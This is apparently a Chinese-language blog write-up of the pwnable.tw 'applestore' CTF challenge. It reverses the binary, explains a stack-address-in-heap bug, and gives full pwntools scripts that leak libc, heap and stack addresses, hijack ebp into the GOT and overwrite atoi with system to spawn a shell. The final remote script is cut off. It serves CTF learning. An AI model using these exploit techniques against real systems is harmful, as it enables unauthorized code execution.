[{"title":"pwnable.tw之applestore","url":"/2020/03/07/applestore/","content":"\n[applestore题目链接](https://pwnable.tw/challenge/#7)\n\n这是一道我看着看着想哭的题目，真的太绕了。\n\n# 1 分析\n\n## 1.1 linux下查看二进制信息\n\n```shell\n$ file applestore\napplestore: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=35f3890fc458c22154fbc1d65e9108a6c8738111, not stripped\n\n$ checksec applestore\n[*] '/mnt/hgfs/vmshare/applestore/applestore'\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x8048000)\n```\n\n可以得到如下信息：\n\n- 32位二进制程序，动态链接，没有去符号表\n- got表可写\n- 开启栈不可执行，并有canary\n- 没有开启地址随机化\n\n## 1.2 IDA逆向源码逻辑\n\nmain函数中，前两个函数时设置超时的，60秒程序就timeout了。\n\n- memset将全局变量mycart的16个字节全部初始化为0。\n- menu函数中做一些信息打印。从代码中可以看到，有6个选项。\n- handler函数中会进行一些处理。其中handler函数是重点，接下来我们对其中的每个函数详细分析。\n\n```c\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  signal(14, timeout);\n  alarm(0x3Cu);\n  memset(&myCart, 0, 0x10u);\n  menu();\n  return handler();\n}\n\nint menu()\n{\n  puts(\"=== Menu ===\");\n  printf(\"%d: Apple Store\\n\", 1);\n  printf(\"%d: Add into your shopping cart\\n\", 2);\n  printf(\"%d: Remove from your shopping cart\\n\", 3);\n  printf(\"%d: List your shopping cart\\n\", 4);\n  printf(\"%d: Checkout\\n\", 5);\n  return printf(\"%d: Exit\\n\", 6);\n}\n\nunsigned int handler()\n{\n  char which_phone; // [esp+16h] [ebp-22h]\n  unsigned int v2; // [esp+2Ch] [ebp-Ch]\n\n  v2 = __readgsdword(0x14u);\n  while ( 1 )\n  {\n    printf(\"> \");\n    fflush(stdout);\n    my_read(&which_phone, 0x15u);\n    switch ( atoi(&which_phone) )\n    {\n      case 1:\n        list();                                 // apple store\n        break;\n      case 2:\n        add();                                  // Add into your shopping cart\n        break;\n      case 3:\n        delete();                               // Remove from your shopping cart\n        break;\n      case 4:\n        cart();                                 // List your shopping cart\n        break;\n      case 5:\n        checkout();                             // Checkout\n        break;\n      case 6:\n        puts(\"Thank You for Your Purchase!\");   // Exit\n        return __readgsdword(0x14u) ^ v2;\n      default:\n        puts(\"It's not a choice! Idiot.\");\n        break;\n    }\n  }\n}\n```\n\n### 1.2.1 list\n\n这个函数没什么好关注的，就是很多条打印信息，将苹果商店里有的商品及价格展示给我们。\n\n```c\nint list()\n{\n  puts(\"=== Device List ===\");\n  printf(\"%d: iPhone 6 - $%d\\n\", 1, 199);\n  printf(\"%d: iPhone 6 Plus - $%d\\n\", 2, 299);\n  printf(\"%d: iPad Air 2 - $%d\\n\", 3, 499);\n  printf(\"%d: iPad Mini 3 - $%d\\n\", 4, 399);\n  return printf(\"%d: iPod Touch - $%d\\n\", 5, 199);\n}\n```\n\n### 1.2.2 add\n\nadd函数的主要逻辑是将我们选择的商品添加进购物车。此函数看上去比较多，涉及5个case分支。实际只需关注create和insert两个函数功能。\n\n```c\nunsigned int add()\n{\n  _DWORD *v1; // [esp+1Ch] [ebp-2Ch]\n  char nptr; // [esp+26h] [ebp-22h]\n  unsigned int v3; // [esp+3Ch] [ebp-Ch]\n\n  v3 = __readgsdword(0x14u);\n  printf(\"Device Number> \");\n  fflush(stdout);\n  my_read(&nptr, 0x15u);\n  switch ( atoi(&nptr) )\n  {\n    case 1:\n      v1 = (_DWORD *)create(\"iPhone 6\", 199);\n      insert(v1);\n      goto LABEL_8;\n    case 2:\n      v1 = (_DWORD *)create(\"iPhone 6 Plus\", 299);\n      insert(v1);\n      goto LABEL_8;\n    case 3:\n      v1 = (_DWORD *)create(\"iPad Air 2\", 499);\n      insert(v1);\n      goto LABEL_8;\n    case 4:\n      v1 = (_DWORD *)create(\"iPad Mini 3\", 399);\n      insert(v1);\n      goto LABEL_8;\n    case 5:\n      v1 = (_DWORD *)create(\"iPod Touch\", 199);\n      insert(v1);\nLABEL_8:\n      printf(\"You've put *%s* in your shopping cart.\\n\", *v1);\n      puts(\"Brilliant! That's an amazing idea.\");\n      break;\n    default:\n      puts(\"Stop doing that. Idiot!\");\n      break;\n  }\n  return __readgsdword(0x14u) ^ v3;\n}\n```\n\n#### 1.2.2.1 create\n\ncreate函数中申请一个16字节大小的堆，并将该堆块分成4份。第0~3字节存放asprintf申请的堆空间地址（该新申请的堆中存放的是手机型号的字符串）。第4~7字节存放手机的价格。剩余8个字节目前存放的是0。随后将这个堆块的地址返回给上一层，上一层将该地址传递给insert。\n\n```c\nchar **__cdecl create(int p_type, char *p_money)\n{\n  char **v2; // eax MAPDST\n\n  v2 = (char **)malloc(0x10u);\n  v2[1] = p_money;\n  asprintf(v2, \"%s\", p_type);\n  v2[2] = 0;\n  v2[3] = 0;\n  return v2;\n}\n```\n\ncreate的堆块和asprintf生成的堆块关系如下图：\n\n![](applestore-1.png)\n\n#### 1.2.2.2 insert\n\ninsert函数中，将上一步的堆块和全局变量mycart连接起来，组成如下图1.2.2.2-1的关系。\n\n```c\nint *__cdecl insert(int *info_loc)\n{\n  int *result; // eax\n  _DWORD *i; // [esp+Ch] [ebp-4h]\n\n  for ( i = &myCart; i[2]; i = (_DWORD *)i[2] )\n    ;\n  i[2] = info_loc;\n  result = info_loc;\n  info_loc[3] = (int)i;\n  return result;\n}\n```\n\n图1.2.2.2-1\n\n![](applestore-2.png)\n\n当add第二部手机进购物车的时候，就会生成如图1.2.2.2-2的关系：\n\n![](applestore-3.png)\n\n可以看出，添加进购物车的手机信息都被串成了双链表的形式。因此后续的delete和cart就是双链表删除和遍历的操作。\n\n### 1.2.3 delete\n\ndelete函数的功能主要是，根据我们输入的编号，将购物车中对应的商品删除。\n\n```c\nunsigned int delete()\n{\n  signed int v1; // [esp+10h] [ebp-38h]\n  _DWORD *v2; // [esp+14h] [ebp-34h]\n  int v3; // [esp+18h] [ebp-30h]\n  int v4; // [esp+1Ch] [ebp-2Ch]\n  int v5; // [esp+20h] [ebp-28h]\n  char nptr; // [esp+26h] [ebp-22h]\n  unsigned int v7; // [esp+3Ch] [ebp-Ch]\n\n  v7 = __readgsdword(0x14u);\n  v1 = 1;\n  v2 = (_DWORD *)dword_804B070;\n  printf(\"Item Number> \");\n  fflush(stdout);\n  my_read(&nptr, 0x15u);\n  v3 = atoi(&nptr);\n  while ( v2 )\n  {\n    if ( v1 == v3 )\n    {\n      v4 = v2[2];\n      v5 = v2[3];\n      if ( v5 )\n        *(_DWORD *)(v5 + 8) = v4;\n      if ( v4 )\n        *(_DWORD *)(v4 + 12) = v5;\n      printf(\"Remove %d:%s from your shopping cart.\\n\", v1, *v2);\n      return __readgsdword(0x14u) ^ v7;\n    }\n    ++v1;\n    v2 = (_DWORD *)v2[2];\n  }\n  return __readgsdword(0x14u) ^ v7;\n}\n```\n\n### 1.2.4 cart\n\ncart函数的功能是打印我们购物车中已经存在的商品，并且计算购物车中商品的总额，最后将总额返回。\n\n```c\nint cart()\n{\n  signed int v0; // eax\n  signed int v2; // [esp+18h] [ebp-30h]\n  int v3; // [esp+1Ch] [ebp-2Ch]\n  _DWORD *i; // [esp+20h] [ebp-28h]\n  char buf; // [esp+26h] [ebp-22h]\n  unsigned int v6; // [esp+3Ch] [ebp-Ch]\n\n  v6 = __readgsdword(0x14u);\n  v2 = 1;\n  v3 = 0;\n  printf(\"Let me check your cart. ok? (y/n) > \");\n  fflush(stdout);\n  my_read(&buf, 0x15u);\n  if ( buf == 'y' )\n  {\n    puts(\"==== Cart ====\");\n    for ( i = (_DWORD *)dword_804B070; i; i = (_DWORD *)i[2] )\n    {\n      v0 = v2++;\n      printf(\"%d: %s - $%d\\n\", v0, *i, i[1]);\n      v3 += i[1];\n    }\n  }\n  return v3;\n}\n```\n\n### 1.2.5 checkout\n\ncheckout函数，顾名思义，就是结账的地方。不过这里不管你买多少，都只会输出让你下次再结账的提示。\n\n不过我们可以看到，这里有个if分支。当cart的返回值（购物总价值）为7174美元时，就会弹出一个\"一美元买iphone 8\"的提示。并且调用了asprintf和insert两个函数，将一美元的iphone加入购物车列表中，最后将购物车总价值改为7175.\n\n```c\nunsigned int checkout()\n{\n  int v1; // [esp+10h] [ebp-28h]\n  char *v2; // [esp+18h] [ebp-20h]\n  int v3; // [esp+1Ch] [ebp-1Ch]\n  unsigned int v4; // [esp+2Ch] [ebp-Ch]\n\n  v4 = __readgsdword(0x14u);\n  v1 = cart();\n  if ( v1 == 7174 )\n  {\n    puts(\"*: iPhone 8 - $1\");\n    asprintf(&v2, \"%s\", \"iPhone 8\");\n    v3 = 1;\n    insert(&v2);\n    v1 = 7175;\n  }\n  printf(\"Total: $%d\\n\", v1);\n  puts(\"Want to checkout? Maybe next time!\");\n  return __readgsdword(0x14u) ^ v4;\n}\n```\n\n这里有一个很奇怪的点，跟add函数中添加一部手机的操作不一样。\n\n- add函数中是申请一块堆内存用于存放加入购物车的手机信息\n- 而iphone 8的信息是存在栈空间V2处的，而这个V2又会被加入到之前的链表中。因此一个栈空间地址被写入了堆中，而栈是不断在变化的，因此就出现了一段可能被控制的内存，即V2附近。\n\n由以上代码中的信息，我们可以得到如下图所示栈空间的布局：\n\n![](applestore-4.png)\n\n#### 漏洞点\n\n> checkout里存放在栈上的iphone 8信息就是本题的漏洞点，因为栈的地址被写入了堆中。\n\n这段栈空间在checkout函数返回后，会被其他函数使用。因此堆中指向的栈空间信息是可能被我们任意更改的。\n\n而本题恰好给我们提供了两个函数：cart和delete，分别用于打印和删除（在链表中执行unlink操作时即任意地址写），可以被我们利用来泄露信息和任意地址写限定值（或限定地址写任意值）。\n\n## 1.3 触发漏洞\n\n为了触发漏洞，必须使checkout的iphone 8分支被执行。也就是在执行checkout之前，我们必须add够正好7174美元的手机。手机有4种价格：199, 299, 399, 499。那么怎么搭配这四种价格凑齐7174美元，就需要使用各自的方法了。这里提供几种途径：\n\n- Z3求解器\n- matlab\n- wolf mathematics\n- 靠各位的智力脑算+手算...\n\n这里借用一下我男票算到的结果：6 * 199 + 20 * 299 = 7174\n\n触发脚本如下：\n\n```python\nfrom pwn import *\ncontext(arch='i386',os='linux',log_level='debug')\n\nmyelf = ELF('applestore')\nmyps = process(myelf.path)\n\nadd = '2'\ndelete = '3'\ncart = '4'\ncheckout = '5'\n\ndef mysend(op,payload):\n    myps.sendlineafter('>',op)\n    myps.sendlineafter('>',payload)\n\nfor i in range(6):\n    mysend(add,'1')\nfor i in range(20):\n    mysend(add,'2')\nmysend(checkout,'y')\nmyps.recv()\nmyps.interactive()\n```\n\n执行该脚本，得到如下结果，进入了1美元买iphone8的分支：\n\n```shell\n20: iPhone 6 Plus - $299\n21: iPhone 6 Plus - $299\n22: iPhone 6 Plus - $299\n23: iPhone 6 Plus - $299\n24: iPhone 6 Plus - $299\n25: iPhone 6 Plus - $299\n26: iPhone 6 Plus - $299\n*: iPhone 8 - $1\nTotal: $7175\nWant to checkout? Maybe next time!\n> $  \n```\n\n此时，程序回到了handler分支，checkout的函数栈已经被释放，因此iphone 8的栈空间接下来可能存在两种可能：\n\n- 1、这段栈空间的值没被覆盖，那么iphone 8 的栈块信息是还在的，此时查看链表或者删除链表中该项也许不会有问题。（没有尝试）\n- 2、这段栈空间被分配给了新函数，并且新函数覆盖上了新值。那么此时对整个链表进行查看或删除iphone 8这一项时，就会出现问题。\n\n我们执行4（cart查看购物车），等于将刚刚chekout的栈分配给了cart函数。那么就会出现如下错误（如果使用delete删除最后一项，也会出错）：\n\n```shell\nTotal: $7175\nWant to checkout? Maybe next time!\n> $ 4\n[DEBUG] Sent 0x2 bytes:\n    '4\\n'\n[DEBUG] Received 0x24 bytes:\n    'Let me check your cart. ok? (y/n) > '\nLet me check your cart. ok? (y/n) > $ y\n······\n20: iPhone 6 Plus - $299\n21: iPhone 6 Plus - $299\n22: iPhone 6 Plus - $299\n23: iPhone 6 Plus - $299\n24: iPhone 6 Plus - $299\n25: iPhone 6 Plus - $299\n26: iPhone 6 Plus - $299\n27: �f\\x89p\\x0c\\x89x\\x0e\\x05- $-136495008\n[*] Got EOF while reading in interactive\n$  \n```\n\n出错的原因是，iphone8相关的数据都存在栈上，在checkout函数退出后，栈上的数据被cart函数的局部变量覆盖。导致cart中遍历访问链表时，访问到iphone 8时访问了非法的地址。\n\n# 2 利用\n\n1.2.5节漏洞点中阐述了这个漏洞可以用来泄露信息以及有约束地写。\n\n- 1、如果我们把iphone 8数据所在的栈空间覆盖为构造的特定数据，就可以打印（泄露）我们想要的内容。比如说libc。（后面需要用到堆地址，所以这里还需泄露堆、以及栈空间的地址）\n- 2、有约束地写，由于got表可写，因此我们一定是利用这个任意地址写去覆写got表项。\n\n## 2.1 信息泄露- cart\n\n如下图所示，精心布置cart函数的栈帧，控制ebp-0x20处连续16个字节的值（在IDA中查看cart函数的伪码可知，ebp-0x20 ~ ebp-0x10空间是输入buf，可控）。如图中红色栈块所示，cart函数打印到栈上的块时，会将got表中puts函数的地址打印出来。并且由于fd不为空，会继续以mycart偏移8字节处作为一个新块，去打印info_loc的地址，此时就将堆的地址泄露出来了（当然也可以像泄露puts地址一样，去泄露堆地址）。\n\n利用泄露puts函数地址的方法，可以逐步泄露其他信息。\n\n![](applestore-5.png)\n\n### 2.1.1 泄露libc和堆地址\n\n```python\nfrom pwn import *\ncontext(arch='i386',os='linux',log_level='debug')\n\nmyelf = ELF('applestore')\nmylibc = ELF('/lib32/libc-2.23.so')\nmyps = process(myelf.path)\n\nadd = '2'\ndelete = '3'\ncart = '4'\ncheckout = '5'\n\ndef mysend(op,payload):\n    myps.sendlineafter('> ',op)\n    myps.sendlineafter('> ',payload)\n\nfor i in range(6):\n    mysend(add,'1')\nfor i in range(20):\n    mysend(add,'2')\nmysend(checkout,'y')\n\npayload = 'y\\x00'+p32(myelf.got['puts'])+p32(1)+p32(0x0804B070)+p32(1)\nmysend(cart,payload)\n\nmyps.recvuntil('27: ')\nlibc_addr = u32(myps.recv(4))-mylibc.symbols['puts']\nmyps.recvuntil('28: ')\nheap_addr = u32(myps.recv(4))\n##修正heap地址\n#heap_addr = u32(myps.recv(44)) - 0x490\n\nlog.warn('libc_addr:0x%x' % libc_addr)\nlog.warn('heap_addr:0x%x' % heap_addr)\n\ngdb.attach(myps,'b * 0x08048BEB')\nmyps.interactive()\n```\n\n打印出的两个地址如下：\n\n```shell\n[!] libc_addr:0xf7d5a000\n[!] heap_addr:0x830c490\n```\n\n在执行脚本过程中弹出的gdb调试终端框中，执行vmmap，查看libc的起始地址为0xf7d5a000。使用heap chunks查看第一个堆的地址（0x830c008 - 0x8 = 0x830c000），并对上述打印的堆地址修正（0x830c000 = 0x830c490 - 0x490，已更改到上述代码中）：\n\n```bash\ngef➤  vmmap\nStart      End        Offset     Perm Path\n0xf7d5a000 0xf7f07000 0x00000000 r-x /lib32/libc-2.23.so\n0xf7f07000 0xf7f08000 0x001ad000 --- /lib32/libc-2.23.so\n0xf7f08000 0xf7f0a000 0x001ad000 r-- /lib32/libc-2.23.so\n0xf7f0a000 0xf7f0b000 0x001af000 rw- /lib32/libc-2.23.so\n\ngef➤  heap chunks\nChunk(addr=0x830c008, size=0x408, flags=PREV_INUSE)\n    [0x0830c008     3e 20 3a 20 90 c4 30 08 c7 20 2d 20 24 30 0a 08    > : ..0.. - $0..]\nChunk(addr=0x830c410, size=0x18, flags=PREV_INUSE)\n    [0x0830c410     90 c4 30 08 c7 00 00 00 28 c4 30 08 68 b0 04 08    ..0.....(.0.h...]\nChunk(addr=0x830c428, size=0x18, flags=PREV_INUSE)\n    [0x0830c428     40 c4 30 08 c7 00 00 00 50 c4 30 08 10 c4 30 08    @.0.....P.0...0.]\nChunk(addr=0x830c440, size=0x10, flags=PREV_INUSE)\n    [0x0830c440     69 50 68 6f 6e 65 20 36 00 00 00 00 19 00 00 00    iPhone 6........]\n```\n\n### 2.1.2 泄露栈地址\n\n第26个节点的fd中存放的是第27个节点的地址（即栈中某个地址）。\n\n接着在1.3.1节中弹出的gdb调试框中，打印esp和ebp的值，分别为0xfffd4038和0xfffd4078。由此我们推测栈空间的地址应该是由0xfffd开头的，然后去打印出的堆chunks中寻找\"fd ff\"字样。仅在addr=0x830c8a8的chunk中找到一个\"0xfffd4058\"，这就是一个栈空间的地址。那么该地址值距离堆起始地址的偏移是0x830c8a8 + 0x8 - 0x830c000 = 0x8b0：\n\n```shell\nChunk(addr=0x830c890, size=0x18, flags=PREV_INUSE)\n    [0x0830c890     10 c9 30 08 2b 01 00 00 a8 c8 30 08 40 c8 30 08    ..0.+.....0.@.0.]\nChunk(addr=0x830c8a8, size=0x18, flags=PREV_INUSE)\n    [0x0830c8a8     c0 c8 30 08 2b 01 00 00 58 40 fd ff 90 c8 30 08    ..0.+...X@....0.]\nChunk(addr=0x830c8c0, size=0x18, flags=PREV_INUSE)\n    [0x0830c8c0     69 50 68 6f 6e 65 20 36 20 50 6c 75 73 00 00 00    iPhone 6 Plus...]\nChunk(addr=0x830c8d8, size=0x10, flags=PREV_INUSE)\n    [0x0830c8d8     69 50 68 6f 6e 65 20 38 00 00 00 00 29 00 00 00    iPhone 8....)...]\nChunk(addr=0x830c8e8, size=0x28, flags=PREV_INUSE)\n    [0x0830c8e8     b0 a7 f0 f7 b0 a7 f0 f7 00 00 00 00 11 07 02 00    ................]\nChunk(addr=0x830c910, size=0x18, flags=)\n    [0x0830c910     69 50 68 6f 6e 65 20 36 20 50 6c 75 73 00 00 00    iPhone 6 Plus...]\nChunk(addr=0x830c928, size=0x206e0, flags=PREV_INUSE)  ←  top chunk\ngef➤  p $esp\n$1 = (void *) 0xfffd4038\ngef➤  p $ebp\n$2 = (void *) 0xfffd4078\n```\n\n由上述内容可知，我们想要的栈空间地址在堆起始地址heap_addr+0x8b0处。因此在2.1.1的python代码中再添加一步，就可以泄露栈空间地址：\n\n```python\nfrom pwn import *\ncontext(arch='i386',os='linux',log_level='debug')\n\nmyelf = ELF('applestore')\nmylibc = ELF('/lib32/libc-2.23.so')\nmyps = process(myelf.path)\n\nadd = '2'\ndelete = '3'\ncart = '4'\ncheckout = '5'\n\ndef mysend(op,payload):\n    myps.sendlineafter('> ',op)\n    myps.sendlineafter('> ',payload)\n\nfor i in range(6):\n    mysend(add,'1')\nfor i in range(20):\n    mysend(add,'2')\nmysend(checkout,'y')\n\npayload = 'y\\x00'+p32(myelf.got['puts'])+p32(1)+p32(0x0804B070)+p32(1)\nmysend(cart,payload)\n\nmyps.recvuntil('27: ')\nlibc_addr = u32(myps.recv(4))-mylibc.symbols['puts']\nmyps.recvuntil('28: ')\nheap_addr = u32(myps.recv(4)) - 0x490\n\npayload = 'y\\x00' + p32(heap_addr + 0x8b0) + p32(1) + p32(0x0804B070) + p32(1)\nmysend(cart,payload)\n\nmyps.recvuntil('27: ')\nstack_addr = u32(myps.recv(4))\n\nlog.warn('libc_addr:0x%x' % libc_addr)\nlog.warn('heap_addr:0x%x' % heap_addr)\nlog.warn('satck_addr:0x%x' % stack_addr)\n\ngdb.attach(myps,'b * 0x08048BEB')\nmyps.interactive()\n```\n\n得到如下结果：\n\n```shell\n[!] libc_addr:0xf7d48000\n[!] heap_addr:0x9603000\n[!] satck_addr:0xffb3e518\n===========================================================\nChunk(addr=0x9603890, size=0x18, flags=PREV_INUSE)\n    [0x09603890     10 39 60 09 2b 01 00 00 a8 38 60 09 40 38 60 09    .9`.+....8`.@8`.]\nChunk(addr=0x96038a8, size=0x18, flags=PREV_INUSE)\n    [0x096038a8     c0 38 60 09 2b 01 00 00 18 e5 b3 ff 90 38 60 09    .8`.+........8`.]\nChunk(addr=0x96038c0, size=0x18, flags=PREV_INUSE)\n    [0x096038c0     69 50 68 6f 6e 65 20 36 20 50 6c 75 73 00 00 00    iPhone 6 Plus...]\nChunk(addr=0x96038d8, size=0x10, flags=PREV_INUSE)\n    [0x096038d8     69 50 68 6f 6e 65 20 38 00 00 00 00 29 00 00 00    iPhone 8....)...]\nChunk(addr=0x96038e8, size=0x28, flags=PREV_INUSE)\n    [0x096038e8     b0 87 ef f7 b0 87 ef f7 00 00 00 00 11 07 02 00    ................]\nChunk(addr=0x9603910, size=0x18, flags=)\n    [0x09603910     69 50 68 6f 6e 65 20 36 20 50 6c 75 73 00 00 00    iPhone 6 Plus...]\nChunk(addr=0x9603928, size=0x206e0, flags=PREV_INUSE)  ←  top chunk\ngef➤  p $esp\n$1 = (void *) 0xffb3e4f8\ngef➤  p $ebp\n$2 = (void *) 0xffb3e538\n```\n\n## 2.2 任意地址写 - delete\n\n以下图为例，假如我们要删除info_loc_1这个堆块，则必须执行如下几条命令，将其从链表中拆除：\n\n```c\ninfo_loc_2.bk = info_loc_1.bk\ninfo_loc.fd = info_loc_1.fd\n```\n\n如果只用当前要被删除的项info_loc_1来表示，相当于：\n\n```c\ninfo_loc_1.fd[3] = info_loc_1.bk\ninfo_loc_a.bk[2] = info_loc_1.fd\n//简写为:\nfd[3] = bk\nbk[2] = fd\n```\n\n![](applestore-6.png)\n\n如下图，可以形象地描述任意地址写的两种情况，实际利用使选择任何一种都可。\n\n![](applestore-7.png)\n\n### 2.2.1 泄露ebp地址\n\n下面验证一下handler下的函数在被调用时，其ebp是一样的：\n\n```python\nfrom pwn import *\ncontext(arch='i386',os='linux',log_level='debug')\n\nmyelf = ELF('applestore')\nmylibc = ELF('/lib32/libc-2.23.so')\nmyps = process(myelf.path)\n\nadd = '2'\ndelete = '3'\ncart = '4'\ncheckout = '5'\n\ndef mysend(op,payload):\n    myps.sendlineafter('> ',op)\n    myps.sendlineafter('> ',payload)\n\nfor i in range(6):\n    mysend(add,'1')\nfor i in range(20):\n    mysend(add,'2')\nmysend(checkout,'y')\n\npayload = 'y\\x00'+p32(myelf.got['puts'])+p32(1)+p32(0x0804B070)+p32(1)\nmysend(cart,payload)\n\nmyps.recvuntil('27: ')\nlibc_addr = u32(myps.recv(4))-mylibc.symbols['puts']\nmyps.recvuntil('28: ')\nheap_addr = u32(myps.recv(4)) - 0x490\n\npayload = 'y\\x00' + p32(heap_addr + 0x8b0) + p32(1) + p32(0x0804B070) + p32(1)\nmysend(cart,payload)\n\nmyps.recvuntil('27: ')\nstack_addr = u32(myps.recv(4))\nebp_addr = stack_addr + 0x20\n\nlog.warn('libc_addr:0x%x' % libc_addr)\nlog.warn('heap_addr:0x%x' % heap_addr)\nlog.warn('satck_addr:0x%x' % stack_addr)\nlog.warn('ebp_addr:0x%x' % ebp_addr)\n\ngdb.attach(myps,'b * 0x080489C0 \\nc \\np $ebp')\nmysend(delete,'3')\n\nmyps.interactive()\n```\n\n如下图，发现ebp地址对得上，说明delete函数中的ebp确实跟之前函数的ebp是一致的：\n\n```shell\n[!] libc_addr:0xf7d5f000\n[!] heap_addr:0x8c89000\n[!] satck_addr:0xffa9f2d8\n[!] ebp_addr:0xffa9f2f8\n=========================================================\n[#0] 0x80489c0 → delete()\n[#1] 0x8048c46 → handler()\n[#2] 0x8048cf5 → main()\n──────────────────────────────────────────────────────\n$1 = (void *) 0xffa9f2f8\ngef➤  \n```\n\n### 2.2.2 劫持ebp到got表\n\n泄露完ebp地址后，就可以利用delete函数去更改栈空间中存放的old ebp，从而使函数退出时，实现ebp劫持。\n\n劫持到哪儿呢？当然是got表啦！通过IDA查看该二进制程序中got表的地址是0x0804B000至0x0804B040，因此got表底部为0x0804B044。\n\n将ebp劫持到got表底部的验证代码如下：\n\n```python\nfrom pwn import *\ncontext(arch='i386',os='linux',log_level='debug')\n\nmyelf = ELF('applestore')\nmylibc = ELF('/lib32/libc-2.23.so')\nmyps = process(myelf.path)\n\nadd = '2'\ndelete = '3'\ncart = '4'\ncheckout = '5'\n\ndef mysend(op,payload):\n    myps.sendlineafter('> ',op)\n    myps.sendlineafter('> ',payload)\n\nfor i in range(6):\n    mysend(add,'1')\nfor i in range(20):\n    mysend(add,'2')\nmysend(checkout,'y')\n\npayload = 'y\\x00'+p32(myelf.got['puts'])+p32(1)+p32(0x0804B070)+p32(1)\nmysend(cart,payload)\n\nmyps.recvuntil('27: ')\nlibc_addr = u32(myps.recv(4))-mylibc.symbols['puts']\nmyps.recvuntil('28: ')\nheap_addr = u32(myps.recv(4)) - 0x490\n\npayload = 'y\\x00' + p32(heap_addr + 0x8b0) + p32(1) + p32(0x0804B070) + p32(1)\nmysend(cart,payload)\n\nmyps.recvuntil('27: ')\nstack_addr = u32(myps.recv(4))\nebp_addr = stack_addr + 0x20\n\nfor i in range (23):\n    mysend(delete,'1')\n\ngdb.attach(myps,'b * 0x08048A6F \\nc \\np $ebp')\npayload = '4\\x00' + p32(myelf.got['puts']) + p32(1) + p32(ebp_addr-0xc) + p32(0x0804B044)\nmysend(delete,payload)\n\nmyps.interactive()\n```\n\n在gdb窗口中，验证old ebp确实被替换成了我们想要的0x0804B044（got表尾地址）。\n\n```shell\ngef➤  p $ebp\n$1 = (void *) 0xffba66e8\ngef➤  p $esp\n$2 = (void *) 0xffba66a0\ngef➤  x/20wx 0xffba66e8\n0xffba66e8:\t0x0804b044\t0x08048c46\t0xffba6706\t0x00000015\n0xffba66f8:\t0xffba6718\t0xf7e26020\t0x00000003\t0x0a333918\n0xffba6708:\t0xf7e26000\t0x080486f7\t0x08048e23\t0x00000006\n0xffba6718:\t0xffba6774\t0x87bfaa00\t0xf7f8edbc\t0xf7f001e5\n0xffba6728:\t0xffba6748\t0x08048cf5\t0x0804b068\t0x00000000\ngef➤  x/20wx 0xffba66a0\n0xffba66a0:\t0x08048f98\t0x00000004\t0x0804b028\t0x00000000\n0xffba66b0:\t0x00000004\t0xffba66c8\t0x00000004\t0xffba66dc\n0xffba66c0:\t0x0804b044\t0x00346706\t0x0804b028\t0x00000001\n0xffba66d0:\t0xffba66dc\t0x0804b044\t0x0000000a\t0x87bfaa00\n0xffba66e0:\t0xf7f8d000\t0xf7f8d000\t0x0804b044\t0x08048c46\n```\n\n### 2.2.3 劫持ebp并覆写got表\n\n上述将ebp劫持到got表尾后，程序回到了handler中，函数如下。可以看到which_phone变量在ebp-0x22处（此时ebp-0x22正好在got表中），因此我们可以通过which_phone的输入去更改got表中的内容。\n\n如果我们能把atoi改成system，并且把which_phone的内容改成\"sh\"，那么就能在atoi(&which_phone)时获得shell。\n\n```c\nunsigned int handler()\n{\n  char which_phone; // [esp+16h] [ebp-22h]\n  unsigned int v2; // [esp+2Ch] [ebp-Ch]\n\n  v2 = __readgsdword(0x14u);\n  while ( 1 )\n  {\n    printf(\"> \");\n    fflush(stdout);\n    my_read(&which_phone, 0x15u);\n    switch ( atoi(&which_phone) )\n    { ······\n```\n\ngot表最后几项内容：\n\n```assembly\n.got.plt:0804B030 9C B0 04 08                   off_804B030     dd offset exit          ; DATA XREF: _exit↑r\n.got.plt:0804B034 A0 B0 04 08                   off_804B034     dd offset __libc_start_main\n.got.plt:0804B034                                                                       ; DATA XREF: ___libc_start_main↑r\n.got.plt:0804B038 A4 B0 04 08                   off_804B038     dd offset memset        ; DATA XREF: _memset↑r\n.got.plt:0804B03C A8 B0 04 08                   off_804B03C     dd offset asprintf      ; DATA XREF: _asprintf↑r\n.got.plt:0804B040 AC B0 04 08                   off_804B040     dd offset atoi          ; DATA XREF: _atoi↑r\n.got.plt:0804B040                               _got_plt        ends\n.got.plt:0804B040\n.data:0804B044                               ; =======================================================\n```\n\natoi函数是got表中最后一项，它的上一项是asprintf。,令asprintf的地址为ebp-0x22，则构造which_phone为\"sh\\x00\\x00\" + (mylibc.symbols['system'] + libc_addr)，就可以将asprintf和atoi表项分别覆盖为\"sh\\x00\\x00\"和\"system函数\"。因此当执行switch括号中的atoi(&which_phone)时，相当于执行了system(\"sh\")。\n\n跟2.2.2中劫持ebp到got表的位置不同，这里需将ebp劫持到myelf.got['asprintf']+0x22，才能使其满足上述条件。\n\n因此payload为：\n\n```python\npayload = \"2\\x00\" + p32(myelf.got['puts']) + p32(1) + p32(ebp_addr - 0xc) + p32(myelf.got['asprintf']+0x22)\n```\n\n# 3 EXP\n\n## 3.1 本地\n\n```python\nfrom pwn import *\ncontext(arch='i386',os='linux',log_level='debug')\n\nmyelf = ELF('applestore')\nmylibc = ELF('/lib32/libc-2.23.so')\nmyps = process(myelf.path)\n\nadd = '2'\ndelete = '3'\ncart = '4'\ncheckout = '5'\n\ndef mysend(op,payload):\n    myps.sendlineafter('> ',op)\n    myps.sendlineafter('> ',payload)\n\nfor i in range(6):\n    mysend(add,'1')\nfor i in range(20):\n    mysend(add,'2')\nmysend(checkout,'y')\n\npayload = 'y\\x00'+p32(myelf.got['puts'])+p32(1)+p32(0x0804B070)+p32(1)\nmysend(cart,payload)\n\nmyps.recvuntil('27: ')\nlibc_addr = u32(myps.recv(4))-mylibc.symbols['puts']\nmyps.recvuntil('28: ')\nheap_addr = u32(myps.recv(4)) - 0x490\n\npayload = 'y\\x00' + p32(heap_addr + 0x8b0) + p32(1) + p32(0x0804B070) + p32(1)\nmysend(cart,payload)\n\nmyps.recvuntil('27: ')\nstack_addr = u32(myps.recv(4))\nebp_addr = stack_addr + 0x20\n\nfor i in range (23):\n    mysend(delete,'1')\n\npayload = '4\\x00' + p32(myelf.got['puts']) + p32(1) + p32(ebp_addr-0xc) + p32(myelf.got['asprintf']+0x22)\nmysend(delete,payload)\n\nwhich_phone = \"sh\\x00\\x00\" + p32(mylibc.symbols['system'] + libc_addr)\nmyps.sendlineafter('> ',which_phone)\nmyps.interactive()\n```\n\n## 3.2 远程\n\n```python\nfrom pwn import *\ncontext(arch='i386',os='linux',log_level='debug')\n\nmyelf 